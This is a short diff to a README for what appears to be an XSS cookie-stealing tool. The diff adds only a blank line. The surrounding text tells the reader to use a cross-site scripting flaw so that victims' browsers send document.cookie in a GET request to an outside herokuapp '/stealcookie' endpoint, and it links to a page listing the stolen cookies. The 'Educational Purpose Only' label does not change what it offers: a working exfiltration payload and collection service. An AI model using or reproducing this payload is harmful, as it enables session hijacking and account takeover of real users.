@@ -6,6 +6,7 @@ Collects user's cookie with XSS vulnerability.
 
 ## Usage
 *Educational Purpose Only*
+
 Use Cross Site Scripting vulnerability to force user make GET request to ```"https://inwza007.herokuapp.com/stealcookie?c="+document.cookie```
 
 [See all stolen cookies](https://inwza007.herokuapp.com/cookies)
